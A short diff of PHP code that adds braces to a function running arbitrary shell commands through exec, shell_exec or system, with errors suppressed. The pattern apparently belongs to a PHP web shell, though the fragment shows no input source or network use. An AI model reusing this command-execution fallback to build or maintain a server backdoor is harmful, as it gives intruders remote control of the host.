@@ -7,8 +7,9 @@ function command($cmd,$cwd,$com = false) {
 		$res = join("\n",$res); 
 		$msg = 'exec'; 
 	}
-	elseif(function_exists('shell_exec')) 
+	elseif(function_exists('shell_exec')){
 		$res = @shell_exec ($cmd); $msg = 'shell_exec'; 
+	}
 	elseif(function_exists('system')){ 
 		ob_start(); 
 		@system ($cmd); 
